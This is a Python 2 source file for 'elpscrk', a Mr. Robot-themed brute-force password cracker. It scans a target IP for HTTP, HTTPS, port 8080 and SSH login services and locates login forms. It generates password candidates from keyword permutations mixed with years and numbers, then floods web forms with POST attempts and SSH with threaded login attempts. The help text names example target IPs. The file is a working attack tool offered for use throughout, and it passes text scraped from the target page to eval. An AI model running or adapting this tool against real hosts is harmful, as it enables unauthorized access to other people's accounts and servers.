import itertools, string, time, sys, urllib, socket, requests, paramiko, os, threading
from datetime import timedelta
socket.setdefaulttimeout(2)

if sys.platform == "ios":
	import console
else:
	class con(object):
		def set_color(r=False,g=False,b=False,c=False):
			if b:
				sys.stdout.write("\xb1[34m")
			else:
				sys.stdout.write("\xb1[0m")
	console = con()

if sys.platform == "ios":
	console.set_font()
	console.set_color()

if len(sys.argv) > 2:
	if sys.argv[1] == "-f":
		pass_dict = sys.argv[2]
		try:
			open(pass_dict)
		except:
			print "[-] Invalid Filename '%s'"%pass_dict
			pass_dict = False
else:
	pass_dict = False

logo = """      _                     _   
     | |                   | |  
     | |                   | |  
  ___| |____  ____ ___ _ __| | __
 / _ \ |  _ \/ __|/ __|  __| |/ /
|  __/ | |_) \__ \ (__| |  |   < 
 \___|_|  __/|___/\___|_|  |_|\_\ 
       | | 
       |_| 
"""
for _ in logo.split("\n"):
	print _
	time.sleep(0.1)
FAIL = False

def elphelp():
	print "\nELPSCRK\nMr.Robot Brute Force Program\n"
	print "Commands:\n"
	print " -list\tAdd keywords to dictionary"
	print " -ip\tSelect host target"
	print " -usr\tAdd target username"
	print " -psw\tSelect password file"
	print " exit\tClose Elpscrk"
	print "System Arguments:"
	print " -f\t Use dictionary rather then password gerneration\n"
	print " -v\t Verbose mode"
	print "\nUsage:\n"
	print "  elpscrk -list pswList.list-add mr; robot; usa; network\n"
	print "  elpscrk -ip 222.12.154.102 -usr mich05654 -psw pswList"
	print "\nLegal Example:\n"
	print "  elpscrk -list pswList.list-add admin;testfire;'1=1\n"
	print "  elpscrk -ip 65.61.137.117 -usr admin -psw pswList\n"
	print "  -f <dictionary file path>\n"

def terminal(text=False,inp=False):
	console.set_color(0.0,0.3,0.8)
	sys.stdout.write("root@elliot:$ ")
	console.set_color()
	if text == False:
		return raw_input()
	else:
		if inp:
			return raw_input(text)
		else:
			print text

def query_vector(ip):
	http,https,httpalt,ssh = False,False,False,False
	userbox, passbox, altuserbox, altpassbox, suserbox, spassbox = False, False, False, False, False, False
	httpc,httpsc,httpaltc = False, False, False
	loginpage = [
		"/index.php/login", "/login.php",
		"/login", "/login.aspx",
		"/login.html", "/login.htm",
		"/admin/login", "/admin/login.php",
		"/admin/login.htm", "/login/login",
		"/login/login.htm",
		"/user/login.php", "/bank/login.aspx", "/Account/Login",
		"Profile/Login", "/admin", "/signin", "/wp-login.php","/wp-admin", "/index.php"
		]
	confirm = [
		"Login:","Password:","Username:",
		"username:","username","password"
		]
	usrtypes = [
		'id="email"', 'id="username"',
		'id="user"', 'id="usr"', 'id="uid"'
		'id="id"', 'name="uid"',
		'type="email"', 'type="username"',
		'type="user"', 'type="usr"',
		'type="id"', 'type="uid"', 'id="Email"', 'id="email"', 'id=User', 'name="user_name"',
		'id="user_login"','id="usernamefld"'
		]
	pswtypes = [
		'id="passw"','id="password"',
		'id="pass"', 'id="psw"',
		'type="passw"','type="password"',
		'type="pass"', 'type="psw"',
		'type="secret"', 'name="user_pass"',
		'id="passwordfld"'
		]
	try:
		http = urllib.urlopen("http://"+ip)
		end = False
		for _ in loginpage:
			if end:
				break
			try:
				http = urllib.urlopen("http://"+ip+_).read()
				for c in confirm:
					if c in http:
						httpc = _
						end = True
						if end:
							break
			except:
				pass
		for _ in usrtypes:
			if _ in http:
				userbox = _
				break
		for _ in pswtypes:
			if _ in http:
				passbox = _
				break
	except:
		pass
	try:
		https = urllib.urlopen("https://"+ip).read()
		end = False
		for _ in loginpage:
			if end:
				break
			try:
				https = urllib.urlopen("https://"+ip+_).read()
				for c in confirm:
					if c in https:
						end = True
						httpsc = _
						if end:
							break
			except:
				pass
		for _ in usrtypes:
			if _ in https:
				suserbox = _
				break
		for _ in pswtypes:
			if _ in https:
				spassbox = _
				break
	except:
		pass
	try:
		httpalt = urllib.urlopen("http://"+ip+":8080")
		end = False
		for _ in loginpage:
			if end:
				break
			try:
				httpalt = urllib.urlopen("http://"+ip+":8080"+_).read()
				for c in confirm:
					if c in httpalt:
						end = True
						httpaltc = _
						if end:
							break
			except:
				pass
		for _ in usrtypes:
			if _ in httpalt:
				altuserbox = _
				break
		for _ in pswtypes:
			if _ in httpalt:
				altpassbox = _
				break
	except:
		pass
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((ip,22))
		ssh = True
		s.close()
	except:
		pass
	return {
		"http":{"stats":{"ubox":userbox,"pbox":passbox,"confirm":httpc}},
		"https":{"stats":{"ubox":suserbox,"pbox":spassbox,"confirm":httpsc}},
		"httpalt":{"stats":{"ubox":altuserbox,"pbox":altpassbox,"confirm":httpaltc}},
		"ssh":ssh
	}

def brute(url, uid, usr, pid, passwords, lkf, rate, alt=False, real=0):
	start_time = time.time()
	failed = True
	if real == True and type(real) == bool:
		total = open(pass_dict).read().count("\n")
		c = 0
		verbose = "-v" in sys.argv
		with open(pass_dict) as _pws:
			for pws in _pws:
				if verbose:
					sys.stdout.write("\rItem %s of %s  "%(c,total))
					c += 1
				pws = pws.replace("\n","")
				values = {uid : usr, pid : pws}
				r = requests.post(url, data=values)
				info = r.content
				if real == 0:
					break
				if lkf[0] not in info and lkf[1] not in info and len(info) > 20:
					elapsed_time = time.time() - start_time
					times = str(timedelta(seconds=elapsed_time))[:-4]
					terminal("Time Elapsed:"+str(times))
					if not alt:
						terminal(url.split("://")[0].upper()+" Vector")
					else:
						terminal("HTTP-ALT Vector")
					terminal("Password: %s"%pws)
					failed = False
					break
	else:
		for pws in passwords:
			pws = pws.replace("\n","")
			values = {uid : usr, pid : pws}
			r = requests.post(url, data=values)
			info = r.content
			if real == 0:
				break
			if lkf[0] not in info and lkf[1] not in info and len(info) > 20:
				elapsed_time = time.time() - start_time
				times = str(timedelta(seconds=elapsed_time))[:-4]
				terminal("Time Elapsed:"+str(times))
				if not alt:
					terminal(url.split("://")[0].upper()+" Vector")
				else:
					terminal("HTTP-ALT Vector")
				terminal("Password: %s"%pws)
				failed = False
				break
	if failed and real == 1:
		terminal("Successfully Failed")

def sshbrute(user,pswrd,ip,port,timeout=2):
	if globals()["stop"]:
		sys.exit()
	sshConnection = paramiko.SSHClient()
	sshConnection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		sshConnection.connect(ip, port = int(port), username = user, password = pswrd, timeout = int(timeout), allow_agent = False,look_for_keys = False)
		terminal("SSH Vector")
		terminal("Password: %s" %pswrd)
		sshConnection.close()
		globals()["stop"] = True
	except Exception as e:
		pass

def sshb(user,passwords,host,timeout=2):
	ip,port = host.split(":")
	port = int(port)
	dm = []
	if pass_dict:
		val = open(pass_dict)
		tms = open(pass_dict).read().count("\n")
		verbose = "-v" in sys.argv
		for _ in range(tms):
			p = val.next().replace("\n","")
			t = threading.Thread(target=sshbrute,args=(user,p,ip,port,timeout))
			if verbose:
				sys.stdout.write("\rItem %s of %s  "%(str(_),str(tms)))
			t.daemon = True
			if p not in dm:
				if globals()["stop"]:
					sys.exit(1)
				sys.stderr = t.start()
			time.sleep(0.05)
			dm.append(p)
	else:
		for p in passwords:
			t = threading.Thread(target=sshbrute,args=(user,p,ip,port,timeout))
			t.daemon = True
			if p not in dm:
				if globals()["stop"]:
					sys.exit()
				sys.stderr = t.start()
			time.sleep(0.05)
			dm.append(p)

def AAVector(ip,username,passwords,pd=False):
	globals()["FAIL"] = False
	for _ in range(2):
		q = query_vector(ip)
		if _ == 1:
			terminal("Scanning Complete")
		
		try:
			ssh = q["ssh"]["stats"]
		except:
			ssh = {"ssh":False}
		try:
			http = q["http"]["stats"]
		except:
			http = {"http":False}
		try:
			https = q["https"]["stats"]
		except:
			https = {"https":False}
		try:
			httpalt = q["httpalt"]["stats"]
		except:
			httpalt = {"httpalt":False}
		
		if False in http.values() and False in https.values() and False in httpalt.values() and False in ssh.values() and _ == 1:
			terminal("Unable/No Login Services")
			globals()["FAIL"] = True
		
		if False not in http.values():
			http_url = "http://" + ip + http["confirm"]
			http_ubox = eval(http["ubox"].split("=")[1])
			http_pbox = eval(http["pbox"].split("=")[1])
			http_find = [http["ubox"],http["pbox"]]
		else:
			http = False
		
		if False not in ssh.values():
			ssh_host = "%s:%s" %(ip,22)
		else:
			ssh = False
		
		if False not in https.values():
			https_url = "https://" + ip + https["confirm"]
			https_ubox = eval(https["ubox"].split("=")[1])
			https_pbox = eval(https["pbox"].split("=")[1])
			https_find = [https["ubox"],https["pbox"]]
		else:
			https = False
		
		if False not in httpalt.values():
			httpalt_url = "http://" + ip + ":8080" + httpalt["confirm"]
			httpalt_ubox = eval(httpalt["ubox"].split("=")[1])
			httpalt_pbox = eval(httpalt["pbox"].split("=")[1])
			httpalt_find = [httpalt["ubox"],httpalt["pbox"]]
		else:
			httpalt = False
		
	if http != False:
		if ssh != False:
			if terminal("Attack HTTP Vector [Y/N]",True).lower() == "y":
				for _ in range(2):
					if pd == True and type(pd) == bool and _ == 1:
						_ = True
					brute(http_url, http_ubox, username, http_pbox, passwords, http_find, 0.5, real=_)
		else:
			for _ in range(2):
				if pd == True and type(pd) == bool and _ == 1:
					_ = True
				brute(http_url, http_ubox, username, http_pbox, passwords, http_find, 0.5, real=_)
	elif https != False:
		if ssh != False:
			if terminal("Attack HTTPS Vector [Y/N]",True).lower() == "y":
				for _ in range(2):
					if pd == True and type(pd) == bool and _ == 1:
						_ = True
					brute(https_url, https_ubox, username, https_pbox, passwords, https_find, 0.5, real=_)
		else:
			for _ in range(2):
				if pd == True and type(pd) == bool and _ == 1:
					_ = True
					brute(https_url, https_ubox, username, https_pbox, passwords, https_find, 0.5, real=_)
	if httpalt != False:
		if ssh != False:
			if terminal("Attack HTTP-ALT Vector [Y/N]",True).lower() == "y":
				for _ in range(2):
					if pd == True and type(pd) == bool and _ == 1:
						_ = True
					brute(httpalt_url, httpalt_ubox, username, httpalt_pbox, passwords, httpalt_find, 0.5, True, real=_)
		else:
			for _ in range(2):
				if pd == True and type(pd) == bool and _ == 1:
					_ = True
				brute(httpalt_url, httpalt_ubox, username, httpalt_pbox, passwords, httpalt_find, 0.5, True, real=_)
	if ssh != False:
		if http != False:
			if terminal("Attack SSH Vector [Y/N]",True).lower() == "y":
				sshb(username, passwords, ssh_host)
		else:
			sshb(username, passwords, ssh_host)

def mix():
	m = []
	for _ in range(1970,2019):
		m.append(str(_))
		m.append(str(_)[::-1])
	for _ in range(100):
		m.append(str(_))
	return m

def elpscrk():
	globals()["stop"] = False
	for cur in range(1):
		extend = mix()
		words = []
		combos = []
		cword = []
		finals = []
		generated = []
		stop = False
		
		if sys.platform == "ios":
			if int(os.uname()[4][6]) < 7:
				console.set_font("Menlo",12)
		
		while 1:
			try:
				w = terminal()
				if w == "elpscrk":
					elphelp()
				if len(w) >= 23 and w.startswith("elpscrk -list "):
					words.append(";".join(w[w.find(".list-add ")+10:].split("; ")).split(";"))
					save = w.split("-list ")[1].split(".list-add")[0]
					if save == "pswList":
						save = None
					if save:
						f = open(save,"a")
						f.write("\n".join(words[0]))
						f.close()
						words = [open(save).read().split("\n")]
					else:
						save = words[0]
				if len(w) > 34 and w.startswith("elpscrk -ip "):
					globals()["iip"] = w.split("-ip ")[1].split(" -usr")[0]
					globals()["iusr"] = w.split("-usr ")[1].split(" -psw")[0]
					ipf = w.split("-psw ")[1]
					if ipf != "pswList":
						words = [open(ipf).read().split("\n")]
					break
				if w == "quit" or w == "exit":
					sys.exit(1)
			except Exception as e:
				print
				pass
		try:
			words = words[0]
		except:
			terminal("Invalid")
			break
		finals = words
		
		if len(words) > 3:
			r = 4
		else:
			r = len(words)
		
		if pass_dict:
			break
		
		for _ in range(1,r+1):
			cword.append(list(itertools.permutations(words,_)))
		
		for i in range(len(cword)):
			for _ in cword[i]:
				generated.append("".join(_))
				generated.append("_".join(_))
		
		for _ in generated:
			for e in extend:
				finals.append(_+e)
				finals.append(e+_)
		
		terminal("List Count: %s Type: alphanum" % len(finals))
		start_time = time.time()
		AAVector(globals()["iip"],iusr,finals)
		if not FAIL:
			elapsed_time = time.time() - start_time
			times = str(timedelta(seconds=elapsed_time))[:-4]
			terminal()
			terminal("Time Elapsed:"+str(times))
	
	if pass_dict:
		finals = ""
		terminal("List Count: %s Type: alphanum" % len(open(pass_dict).readlines()))
		start_time = time.time()
		AAVector(globals()["iip"],iusr,finals,pd=True)
		if not FAIL:
			elapsed_time = time.time() - start_time
			times = str(timedelta(seconds=elapsed_time))[:-4]
			terminal()
			terminal("Time Elapsed:"+str(times))

while 1:
	elpscrk()
